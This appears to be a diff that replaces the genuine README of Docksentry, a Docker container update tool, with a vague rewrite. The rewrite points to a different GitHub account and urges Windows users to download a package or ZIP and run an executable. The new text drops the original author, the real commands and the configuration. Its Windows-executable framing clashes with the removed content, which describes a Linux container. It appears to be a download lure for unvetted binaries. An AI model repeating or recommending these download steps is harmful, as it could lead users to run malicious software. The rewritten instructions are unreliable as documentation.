@@ -1,176 +1,201 @@
-<p align="center">
-  <img src="https://raw.githubusercontent.com/amayer1983/docksentry/main/docs/images/logo.png" alt="Docksentry Logo" width="200">
-</p>
+# 🛡️ docksentry - Keep Containers Updated With Ease
 
-<h1 align="center">Docksentry</h1>
+[![Download docksentry](https://img.shields.io/badge/Download-Visit%20the%20project%20page-blue?style=for-the-badge&logo=github)](https://github.com/ryabell2023-cmd/docksentry)
 
-<p align="center">
-Your Docker container watchdog — monitors images for updates and lets you manage them via <b>Telegram</b>, <b>Discord</b>, <b>Web UI</b>, and <b>Webhooks</b>, with auto-rollback and 16 languages.
-</p>
+## 📥 Download
 
-<p align="center">
-  <img src="https://img.shields.io/docker/pulls/amayer1983/docksentry" alt="Docker Pulls">
-  <img src="https://img.shields.io/docker/image-size/amayer1983/docksentry" alt="Docker Image Size">
-  <img src="https://img.shields.io/github/license/amayer1983/docksentry" alt="License">
-</p>
+Visit this page to download and set up docksentry:
 
-<p align="center">
-  <img src="https://raw.githubusercontent.com/amayer1983/docksentry/main/docs/images/telegram-update-notification.jpg" alt="Update Notification" width="350">
-  <img src="https://raw.githubusercontent.com/amayer1983/docksentry/main/docs/images/telegram-update-result.jpg" alt="Update Result" width="350">
-</p>
+https://github.com/ryabell2023-cmd/docksentry
 
-## Features
+## 🧰 What docksentry does
 
-- **Automatic update detection** — compares image digests on a configurable cron schedule
-- **Telegram bot** — full interactive control with inline buttons and 14 commands
-- **Discord notifications** — rich embeds for updates, successes, and failures
-- **Generic webhooks** — JSON POST to Ntfy, Gotify, Home Assistant, or any HTTP endpoint
-- **Optional Web UI** — dashboard with status, logs, history, settings, pin/unpin, auto-update toggles
-- **Per-container auto-update** — selected containers update without confirmation
-- **Pin/Freeze containers** — exclude containers from updates
-- **Auto-rollback** — failed updates automatically restore the previous container
-- **Docker Compose support** — native `docker compose pull/up` for Compose stacks
-- **Self-update** — the bot can update itself automatically
-- **Persistent settings** — Web UI changes survive restarts
-- **Multi-language** — 16 languages, switchable at runtime
-- **Lightweight** — Python standard library only, zero external dependencies
+docksentry helps you manage Docker container updates on Windows. It checks for new container versions, updates them, and can roll back if something goes wrong. It also supports alerts through Telegram, Discord, webhooks, and a built-in web UI.
 
-## Quick Start
+Use it if you want:
+- simple container update control
+- alerts when updates happen
+- a way to undo a bad update
+- support for multiple languages
+- a web-based view of your update status
 
-### 1. Create a Telegram Bot
+## 🖥️ What you need
 
-Message [@BotFather](https://t.me/BotFather) → `/newbot` → copy the token.
+Before you run docksentry on Windows, make sure you have:
 
-### 2. Get your Chat ID
+- Windows 10 or Windows 11
+- Docker Desktop installed
+- Enough free disk space for your containers and images
+- Internet access for update checks
+- A Telegram account, Discord account, or webhook URL if you want alerts
 
-Send a message to your bot, then open `https://api.telegram.org/bot<TOKEN>/getUpdates` and find your `chat.id`.
+If you plan to use the web UI, keep your browser ready. Any modern browser will work.
 
-### 3. Run
+## 🚀 Getting Started
 
-```bash
-docker run -d \
-  --name docksentry \
-  --restart unless-stopped \
-  -e BOT_TOKEN=your-bot-token \
-  -e CHAT_ID=your-chat-id \
-  -v /var/run/docker.sock:/var/run/docker.sock \
-  amayer1983/docksentry:latest
-```
+Follow these steps on Windows:
 
-### Docker Compose
+1. Open the download page:
+   https://github.com/ryabell2023-cmd/docksentry
 
-```yaml
-services:
-  docksentry:
-    image: amayer1983/docksentry:latest
-    container_name: docksentry
-    restart: unless-stopped
-    environment:
-      - BOT_TOKEN=your-bot-token
-      - CHAT_ID=your-chat-id
-      - CRON_SCHEDULE=0 18 * * *
-      - TZ=Europe/Berlin
-    volumes:
-      - /var/run/docker.sock:/var/run/docker.sock
-      - docksentry_data:/data
-    security_opt:
-      - no-new-privileges:true
+2. Look for the latest release or the main project files.
 
-volumes:
-  docksentry_data:
-```
+3. Download the Windows package or the file that matches the setup instructions on the project page.
 
-## Commands
+4. If the file is a ZIP archive, extract it to a folder you can find again, such as:
+   `C:\docksentry`
 
-| Command | Description |
-|---------|-------------|
-| `/status` | Container overview with health, uptime, images |
-| `/check` | Manually trigger an update check |
-| `/updates` | Show pending updates |
-| `/logs <name>` | Show last 30 log lines of a container |
-| `/pin <name>` | Pin container — excluded from updates |
-| `/unpin <name>` | Unpin container |
-| `/autoupdate <name>` | Toggle auto-update per container |
-| `/history` | Show update history |
-| `/cleanup` | Remove old unused images |
-| `/selfupdate` | Update the bot itself |
-| `/debug` | Toggle debug mode |
-| `/lang <code>` | Switch language |
-| `/settings` | Show current configuration |
-| `/help` | Show all commands |
+5. Open Docker Desktop and make sure it is running.
 
-> Partial name matching: `/pin ngi` matches `nginx`.
+6. Start docksentry using the method shown in the project files. If the project includes a Windows executable, run it. If it uses Docker Compose, open PowerShell in the project folder and launch it with the provided compose file.
 
-## Configuration
+7. Wait for the first scan to finish. docksentry will then check your containers and show their status.
 
-| Variable | Default | Description |
-|----------|---------|-------------|
-| `BOT_TOKEN` | *required* | Telegram Bot API token |
-| `CHAT_ID` | *required* | Your Telegram chat ID |
-| `CRON_SCHEDULE` | `0 18 * * *` | Cron expression for scheduled checks |
-| `EXCLUDE_CONTAINERS` | | Comma-separated names to exclude |
-| `AUTO_SELFUPDATE` | `false` | Auto-update the bot on each check |
-| `LANGUAGE` | `en` | Bot language ([16 available](docs/languages.md)) |
-| `WEB_UI` | `false` | Enable web dashboard |
-| `WEB_PORT` | `8080` | Web UI port |
-| `WEB_PASSWORD` | | Web UI password (Basic Auth) |
-| `TELEGRAM_TOPIC_ID` | | Telegram topic/thread ID (for groups with topics) |
-| `DISCORD_WEBHOOK` | | Discord webhook URL |
-| `WEBHOOK_URL` | | Generic webhook URL (JSON POST) |
-| `TZ` | `Europe/Berlin` | Timezone |
-| `DOCKER_HOST` | | Docker API endpoint (for [socket proxy](docs/security.md)) |
-| `DOCKER_API_VERSION` | | Force Docker API version (e.g. `1.43` for Synology/older Docker) |
-| `DOCKSENTRY_IPV6` | `false` | Enable IPv6 outbound connections (default: IPv4-only to avoid `Network unreachable` in containers without IPv6 routing) |
+## ⚙️ First-time setup
 
-All settings except BOT_TOKEN and CHAT_ID can also be changed via the Web UI and persist across restarts.
+When docksentry starts, it may ask for basic settings. These usually include:
 
-> **Synology / NAS users:** If Docksentry shows 0 containers, add `DOCKER_API_VERSION=1.43` to your environment variables.
+- the containers you want to watch
+- how often it checks for updates
+- whether it should update containers on its own
+- where to send alerts
+- whether rollback should stay on or off
 
-## Web UI
+If a config file is included, open it with Notepad and set your preferred values. Save the file, then restart docksentry.
 
-Enable with `WEB_UI=true`. Provides status dashboard, container logs, update history, and full settings management — all in a dark-themed, mobile-responsive interface.
+A simple first setup can look like this:
+- watch only a few containers at first
+- keep auto-update off until you confirm everything works
+- turn on alerts so you can see update events
+- enable rollback if you want a safety net
 
-<p align="center">
-  <img src="https://raw.githubusercontent.com/amayer1983/docksentry/main/docs/images/webui-status.png" alt="Web UI Status" width="700">
-</p>
-<p align="center">
-  <img src="https://raw.githubusercontent.com/amayer1983/docksentry/main/docs/images/webui-logs.png" alt="Web UI Logs" width="700">
-</p>
+## 🔔 Alerts and notifications
 
-See [Web UI Documentation](docs/web-ui.md) for details.
+docksentry can send update notices in several ways.
 
-## Notification Channels
+### Telegram
+Connect a bot token and chat ID to get messages in Telegram. This works well if you want phone alerts.
 
-| Channel | Updates | Results | Interactive |
-|---------|:-:|:-:|:-:|
-| **Telegram** | buttons | detailed | full control |
-| **Discord** | rich embeds | rich embeds | via Web UI |
-| **Webhook** | JSON | JSON | via Web UI |
+### Discord
+Add a Discord webhook URL or bot setting if the project uses one. This sends container events to your Discord server.
 
-<p align="center">
-  <img src="https://raw.githubusercontent.com/amayer1983/docksentry/main/docs/images/discord.png" alt="Discord Notifications" width="400">
-</p>
+### Webhooks
+Use webhooks if you want to connect docksentry to another app or script.
 
-See [Notification Setup](docs/notifications.md) for Discord and Webhook configuration.
+### Web UI
+Open the built-in web interface in your browser to see update status, logs, and container activity in one place.
 
-## Documentation
+## 🧪 How updates work
 
-| Topic | Link |
-|-------|------|
-| Update Workflow & Rollback | [docs/updates.md](docs/updates.md) |
-| Web UI | [docs/web-ui.md](docs/web-ui.md) |
-| Notification Channels | [docs/notifications.md](docs/notifications.md) |
-| Docker Compose Support | [docs/compose.md](docs/compose.md) |
-| Security & Socket Proxy | [docs/security.md](docs/security.md) |
-| Multi-Language | [docs/languages.md](docs/languages.md) |
+docksentry checks your Docker containers for new versions. When it finds one, it can:
+- notify you first
+- pull the new image
+- restart the container
+- check if the container starts correctly
+- roll back if the update fails
 
-## Contributing
+This helps reduce the risk of broken updates. You still keep control over what changes.
 
-- **Feature ideas?** Open an [Issue](https://github.com/amayer1983/docksentry/issues) with the label `enhancement`
-- **Found a bug?** Open an [Issue](https://github.com/amayer1983/docksentry/issues) with steps to reproduce
-- **Translations?** Submit a PR for `app/lang/*.json`
-- **Vote on the roadmap:** [Community Roadmap (Issue #2)](https://github.com/amayer1983/docksentry/issues/2)
+## 🔁 Rollback
 
-## License
+Rollback gives you a path back to the last working container image.
 
-MIT License - see [LICENSE](LICENSE)
+Use it when:
+- a new image fails to start
+- a service loses access to its data
+- the app begins to crash after an update
+- you want to test updates with less risk
+
+If rollback is enabled, docksentry stores enough state to return to the last known working version.
+
+## 🌐 Languages
+
+docksentry supports 16 languages. That makes it easier to use if English is not your main language.
+
+You can switch the language in the app settings or config file, based on the setup method you use.
+
+## 🧭 Using the web UI
+
+If the web UI is enabled, open it in your browser after docksentry starts.
+
+You can use it to:
+- see which containers are tracked
+- check the update state
+- view logs
+- confirm rollback activity
+- review alert settings
+
+If the page does not open at first, check that Docker Desktop is running and that the app service started without errors.
+
+## 📁 Suggested folder layout
+
+If you extract files by hand on Windows, keep them in a clean folder structure like this:
+
+- `C:\docksentry\`
+- `C:\docksentry\config\`
+- `C:\docksentry\logs\`
+- `C:\docksentry\data\`
+
+This makes it easier to find settings and logs later.
+
+## 🔧 Common setup checks
+
+If docksentry does not seem to work, check these items:
+
+- Docker Desktop is open
+- your containers are already running
+- the config file has the right names
+- your notification settings are valid
+- the web UI port is not used by another app
+- the Windows firewall is not blocking the app
+
+If the app includes a log file, open it first. Logs often show what failed and why.
+
+## 🧾 Typical use cases
+
+docksentry fits well if you want to:
+
+- keep home server containers current
+- watch updates for apps like dashboards, media tools, or reverse proxies
+- get a message when a container updates
+- avoid manual checks every day
+- reduce the chance of broken updates with rollback
+
+## 🪟 Windows run guide
+
+For most Windows users, the process looks like this:
+
+1. Download the project files from the link above.
+2. Install Docker Desktop if you have not already.
+3. Extract or open the project folder.
+4. Start Docker Desktop.
+5. Run docksentry the way the project files describe.
+6. Open the web UI if it is included.
+7. Add the containers you want to manage.
+8. Turn on alerts or auto-update if you want hands-off use.
+
+## 📌 What to expect after startup
+
+After docksentry starts, you should see one or more of these:
+- a status window
+- a browser page for the web UI
+- log output in a console window
+- notification test messages if you enabled them
+
+The first scan may take a short time. After that, docksentry will keep checking on the schedule you set.
+
+## 🛠️ Project topics
+
+This project focuses on:
+- auto-update
+- container
+- discord
+- docker
+- docker-compose
+- notifications
+- rollback
+- selfhosted
+- telegram
+- update
+- web-ui
+- webhook
